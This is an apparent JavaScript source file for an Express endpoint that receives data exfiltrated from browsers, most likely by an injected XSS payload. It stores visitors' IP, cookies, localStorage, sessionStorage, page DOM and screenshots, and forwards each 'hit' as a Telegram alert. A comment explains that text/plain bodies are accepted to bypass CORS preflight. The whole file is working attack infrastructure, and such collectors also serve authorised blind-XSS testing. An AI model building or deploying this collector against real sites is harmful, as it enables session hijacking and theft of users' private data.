const express = require('express');
const router = express.Router();
const db = require('../db');
const { sendAlert } = require('../lib/telegram');

router.post('/', async (req, res) => {
  res.status(200).json({ status: 'ok' });

  try {
    const ip =
      req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
      req.socket.remoteAddress ||
      'unknown';

    // Handle both JSON body and text/plain (text/plain skips CORS preflight)
    let body = req.body;
    if (typeof body === 'string') {
      try { body = JSON.parse(body); } catch(e) { body = {}; }
    }
    if (!body || typeof body !== 'object') body = {};

    const {
      url, title, referer, origin,
      cookies, localStorage: ls,
      sessionStorage: ss, dom, screenshot, ...extra
    } = body;

    const stmt = db.prepare(`
      INSERT INTO hits (ip, user_agent, origin_url, referer, cookies, local_storage, session_storage, dom, screenshot, extra)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    const result = stmt.run(
      ip,
      req.headers['user-agent'] || null,
      url || null,
      referer || req.headers['referer'] || null,
      cookies && Object.keys(cookies).length ? JSON.stringify(cookies) : null,
      ls && Object.keys(ls).length ? JSON.stringify(ls) : null,
      ss && Object.keys(ss).length ? JSON.stringify(ss) : null,
      dom ? dom.substring(0, 50000) : null,
      screenshot || null,
      Object.keys(extra).length ? JSON.stringify(extra) : null
    );

    const hit = db.prepare('SELECT * FROM hits WHERE id = ?').get(result.lastInsertRowid);
    console.log(`[HIT] #${hit.id} from ${ip} — ${url || 'unknown URL'}`);
    sendAlert(hit).catch(console.error);

  } catch (err) {
    console.error('[Callback] Error:', err.message);
  }
});

// GET probe
router.get('/', (req, res) => {
  res.status(200).send('');
  try {
    const ip =
      req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
      req.socket.remoteAddress ||
      'unknown';

    const stmt = db.prepare(`INSERT INTO hits (ip, user_agent, origin_url, referer) VALUES (?, ?, ?, ?)`);
    const result = stmt.run(ip, req.headers['user-agent'] || null, req.query.url || null, req.headers['referer'] || null);
    const hit = db.prepare('SELECT * FROM hits WHERE id = ?').get(result.lastInsertRowid);
    console.log(`[HIT-GET] #${hit.id} from ${ip}`);
    sendAlert(hit).catch(console.error);
  } catch (err) {
    console.error('[Callback GET] Error:', err.message);
  }
});

module.exports = router;
